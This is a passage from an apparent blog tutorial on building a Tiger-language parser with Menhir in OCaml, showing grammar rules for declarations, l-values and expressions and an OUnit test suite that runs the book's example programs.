<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">var_dec</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;var&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span>         <span style="color:#7f8c8d">&#34;:=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;var&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">ty_ann</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;:=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span></code></pre></div><p>The record and array creation rules below are also considered
top-level expressions:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">create_rec</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">braced</span><span style="color:#728e00">(</span><span style="color:#434f54">init_rec_fields</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">create_arr</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">bracketed</span><span style="color:#728e00">(</span><span style="color:#434f54">expr</span><span style="color:#728e00">);</span> <span style="color:#7f8c8d">&#34;of&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">init_rec_fields</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">separated_list</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;,&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">init_rec_field</span><span style="color:#728e00">);</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">init_rec_field</span>  <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span></code></pre></div><p>Next, we need a function declaration rule:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">fun_dec</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* procedures doesn&#39;t return values *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">fun_head</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">fun_body</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* functions return values and the type is specified after the colon *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">fun_head</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;:&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">fun_body</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">fun_head</span>   <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;function&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">fun_params</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">fun_body</span>   <span style="color:#728e00">:=</span> <span style="color:#434f54">expr</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">fun_params</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">parenthesized</span><span style="color:#728e00">(</span><span style="color:#434f54">ty_fields</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><p>According to our language spec:</p>
<p>&gt; An <code>l-value</code> is a location, whose value may be read or assigned.
&gt; Variables, procedure parameters, fields or records, and
elements are all <code>l-values</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">lvalue</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* variable *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* everything else *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">lvalue_t</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">lvalue_t</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* simple record field *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;.&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* compound record field *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">lvalue_t</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;.&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* simple array subscript *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">bracketed</span><span style="color:#728e00">(</span><span style="color:#434f54">expr</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* compund array subscript *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">lvalue_t</span><span style="color:#728e00">;</span> <span style="color:#434f54">bracketed</span><span style="color:#728e00">(</span><span style="color:#434f54">expr</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><p>Assignment of an expression to <code>lvalue</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">assignment</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">lvalue</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;:=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span></code></pre></div><p>Sequence of expressions delimited by semicolon:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">expr_seq</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">separated_list</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;;&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">expr</span><span style="color:#728e00">);</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">seq</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">parenthesized</span><span style="color:#728e00">(</span><span style="color:#434f54">expr_seq</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><p>Function call rule:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">fun_call</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">parenthesized</span><span style="color:#728e00">(</span><span style="color:#434f54">fun_args</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">fun_args</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">separated_list</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;,&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">expr</span><span style="color:#728e00">);</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Arithmetic, comparison and equality expressions:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">bin</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#434f54">bin_op</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">bin_op</span> <span style="color:#728e00">==</span> <span style="color:#7f8c8d">&#34;+&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;-&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;*&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;/&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&gt;=&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&gt;&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&lt;=&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&lt;&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&lt;&gt;&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;=&#34;</span>
</span></span></code></pre></div><p>Boolean expressions:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">boolean</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#434f54">boolean_op</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">boolean_op</span> <span style="color:#728e00">==</span> <span style="color:#7f8c8d">&#34;&amp;&#34;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;|&#34;</span>
</span></span></code></pre></div><p>Helper rule for a type annotation which we used in the <code>var_dec</code>
and <code>ty_field</code> above:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">ty_ann</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;:&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span>
</span></span></code></pre></div><p>Menhir allows us to declare functions, so these are three helper
functions that we used everywhere else for delimited
expressions:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">parenthesized</span><span style="color:#728e00">(</span><span style="color:#434f54">x</span><span style="color:#728e00">)</span> <span style="color:#728e00">==</span> <span style="color:#434f54">delimited</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;(&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">x</span><span style="color:#728e00">,</span> <span style="color:#7f8c8d">&#34;)&#34;</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">bracketed</span><span style="color:#728e00">(</span><span style="color:#434f54">x</span><span style="color:#728e00">)</span>     <span style="color:#728e00">==</span> <span style="color:#434f54">delimited</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;[&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">x</span><span style="color:#728e00">,</span> <span style="color:#7f8c8d">&#34;]&#34;</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">braced</span><span style="color:#728e00">(</span><span style="color:#434f54">x</span><span style="color:#728e00">)</span>        <span style="color:#728e00">==</span> <span style="color:#434f54">delimited</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;{&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">x</span><span style="color:#728e00">,</span> <span style="color:#7f8c8d">&#34;}&#34;</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><h4 id="test-suite">
  Test suite
  <a class="heading-link" href="#test-suite">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>In order to iterate on our parser quickly we want to automate
the process of testing it against the <a href="https://github.com/vyorkin/tiger/blob/master/book/testcases/test1.tig"  class="external-link" target="_blank" rel="noopener">provided example programs</a>.
The most convenient way to do that would be to create a test
suite that we could run after every change we make.</p>
<p>Some of the provided example Tiger programs are intentionally
broken, so we want to skip those:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">skipped</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#34;test16.tig&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;test17.tig&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;test19.tig&#34;</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#7f8c8d">&#34;test20.tig&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;test25.tig&#34;</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#7f8c8d">&#34;test45.tig&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;test49.tig&#34;</span><span style="color:#728e00">]</span>
</span></span></code></pre></div><p>A couple of helper functions to list the example programs
(recursively):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">is_tig_ext</span> <span style="color:#434f54">filename</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#728e00">(_,</span> <span style="color:#434f54">ext</span><span style="color:#728e00">)</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Filename</span>.<span style="color:#434f54">split_extension</span> <span style="color:#434f54">filename</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">ext</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Some</span> <span style="color:#7f8c8d">&#34;tig&#34;</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#728e00">_</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">false</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">is_tig_file</span> <span style="color:#434f54">f</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Sys</span>.<span style="color:#434f54">is_file_exn</span> <span style="color:#728e00">~</span><span style="color:#434f54">follow_symlinks</span><span style="color:#728e00">:</span><span style="color:#434f54">true</span> <span style="color:#434f54">f</span> <span style="color:#728e00">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">is_tig_ext</span> <span style="color:#434f54">f</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#728e00">rec</span> <span style="color:#434f54">ls_rec</span> <span style="color:#434f54">dir</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">if</span> <span style="color:#434f54">is_tig_file</span> <span style="color:#434f54">dir</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">then</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> <span style="color:#434f54">not</span><span style="color:#728e00">(</span><span style="color:#434f54">List</span>.<span style="color:#434f54">mem</span> <span style="color:#434f54">skipped</span> <span style="color:#728e00">(</span><span style="color:#434f54">Filename</span>.<span style="color:#434f54">basename</span> <span style="color:#434f54">dir</span><span style="color:#728e00">)</span> <span style="color:#728e00">~</span><span style="color:#434f54">equal</span><span style="color:#728e00">:(=))</span> <span style="color:#728e00">then</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">[</span><span style="color:#434f54">dir</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">[]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">dir</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|&gt;</span> <span style="color:#434f54">Sys</span>.<span style="color:#434f54">ls_dir</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|&gt;</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">concat_map</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">~</span><span style="color:#434f54">f</span><span style="color:#728e00">:(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">sub</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">ls_rec</span> <span style="color:#728e00">(</span><span style="color:#434f54">Filename</span>.<span style="color:#434f54">concat</span> <span style="color:#434f54">dir</span> <span style="color:#434f54">sub</span><span style="color:#728e00">))</span>
</span></span></code></pre></div><p>Let’s add another helper function to get current position along
with a filename as a string. We’ll need it later to output an
error location:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">position</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">pos</span> <span style="color:#728e00">=</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">.</span><span style="color:#434f54">lex_curr_p</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">col</span> <span style="color:#728e00">=</span> <span style="color:#434f54">pos</span><span style="color:#728e00">.</span><span style="color:#434f54">pos_cnum</span> <span style="color:#728e00">-</span> <span style="color:#434f54">pos</span><span style="color:#728e00">.</span><span style="color:#434f54">pos_bol</span> <span style="color:#728e00">+</span> <span style="color:#434f54">1</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Printf</span>.<span style="color:#434f54">sprintf</span> <span style="color:#7f8c8d">&#34;%s:%d:%d&#34;</span> <span style="color:#434f54">pos</span><span style="color:#728e00">.</span><span style="color:#434f54">pos_fname</span> <span style="color:#434f54">pos</span><span style="color:#728e00">.</span><span style="color:#434f54">pos_lnum</span> <span style="color:#434f54">col</span>
</span></span></code></pre></div><p>And another two functions to run the parser and print the error
details in case of failure:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">parse_with_error</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">try</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Parser</span>.<span style="color:#434f54">main</span> <span style="color:#434f54">Lexer</span>.<span style="color:#434f54">read</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assert_bool</span> <span style="color:#7f8c8d">&#34;Ok&#34;</span> <span style="color:#434f54">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">SyntaxError</span> <span style="color:#434f54">msg</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assert_failure</span> <span style="color:#728e00">(</span><span style="color:#434f54">position</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">^</span> <span style="color:#7f8c8d">&#34; : &#34;</span> <span style="color:#728e00">^</span> <span style="color:#434f54">msg</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Parser</span>.<span style="color:#434f54">Error</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assert_failure</span> <span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;Syntax error: &#34;</span> <span style="color:#728e00">^</span> <span style="color:#434f54">position</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">parse</span> <span style="color:#434f54">filename</span> <span style="color:#434f54">ch</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Lexing</span>.<span style="color:#434f54">from_channel</span> <span style="color:#434f54">ch</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">lexbuf</span><span style="color:#728e00">.</span><span style="color:#434f54">lex_curr_p</span> <span style="color:#728e00">&lt;-</span> <span style="color:#728e00">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">lexbuf</span><span style="color:#728e00">.</span><span style="color:#434f54">lex_curr_p</span> <span style="color:#728e00">with</span> <span style="color:#434f54">pos_fname</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Filename</span>.<span style="color:#434f54">basename</span> <span style="color:#434f54">filename</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">};</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">parse_with_error</span> <span style="color:#434f54">lexbuf</span>
</span></span></code></pre></div><p>Here is the function that we’re going to call for each <code>.tig</code>
file:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">run_parser</span> <span style="color:#434f54">filename</span> <span style="color:#728e00">_</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">In_channel</span>.<span style="color:#434f54">with_file</span> <span style="color:#434f54">filename</span> <span style="color:#728e00">~</span><span style="color:#434f54">f</span><span style="color:#728e00">:(</span><span style="color:#434f54">parse</span> <span style="color:#434f54">filename</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><p>Finally, the test suite is going to look like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">suite</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#7f8c8d">&#34;tiger programs&#34;</span> <span style="color:#728e00">&gt;:::</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">tests_dir</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;../../../book&#34;</span> <span style="color:#728e00">^</span> <span style="color:#434f54">Filename</span>.<span style="color:#434f54">dir_sep</span> <span style="color:#728e00">^</span> <span style="color:#7f8c8d">&#34;testcases&#34;</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">tests_path</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Filename</span>.<span style="color:#728e00">(</span><span style="color:#434f54">concat</span> <span style="color:#434f54">parent_dir_name</span> <span style="color:#434f54">tests_dir</span><span style="color:#728e00">)</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">tig_files</span> <span style="color:#728e00">=</span> <span style="color:#434f54">ls_rec</span> <span style="color:#434f54">tests_path</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">(</span><span style="color:#434f54">List</span>.<span style="color:#434f54">map</span> <span style="color:#728e00">~</span><span style="color:#434f54">f</span><span style="color:#728e00">:</span>
</span></span><span style="display:flex;"><span>     <span style="color:#728e00">(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">filename</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">Filename</span>.<span style="color:#434f54">basename</span> <span style="color:#434f54">filename</span> <span style="color:#728e00">&gt;::</span> <span style="color:#434f54">run_parser</span> <span style="color:#434f54">filename</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>     <span style="color:#434f54">tig_files</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">run_test_tt_main</span> <span style="color:#434f54">suite</span>
</span></span></code></pre></div><p>The dune file for our test suite project will simply run the
<code>testsuite.exe</code> executable:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lisp" data-lang="lisp"><span style="display:flex;"><span>(<span style="color:#434f54">executable</span>
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">name</span> <span style="color:#434f54">testsuite</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">libraries</span> <span style="color:#434f54">base</span> <span style="color:#434f54">core</span> <span style="color:#434f54">ch3</span> <span style="color:#434f54">oUnit</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(<span style="color:#434f54">alias</span>
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">name</span> <span style="color:#434f54">runtest</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">action</span> (<span style="color:#434f54">run</span> <span style="color:#728e00">.</span><span style="color:#434f54">/testsuite.exe</span>)))
</span></span></code></pre></div><p>Now it’ll be much easier to work on the parser implementation.
Also this test suite might be useful to detect possible
regressions if we want to change the parser in the future.</p>
<h4 id="conclusion">
  Conclusion
  <a class="heading-link" href="#conclusion">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Of course, I didn’t come up with this grammar right away. I
spent almost a week implementing this parser. I started with a
simple parser for “straightline programs” and iterated on it
until it evolved to the fully functional Tiger-language grammar.
And it took some time for me to figure out how to resolve all
the shift-reduce conflicts.</p>
<p>Another cool feature of Menhir is its REPL, which might be
helpful for debugging. This is especially useful when you
already caught a parser error by running the test suite and now
you want to try constructing an invalid expression to check your
hypothesis. I used this kind of workflow a lot while working on
this grammar.</p>
<p>You can run the interpreter like this:</p>
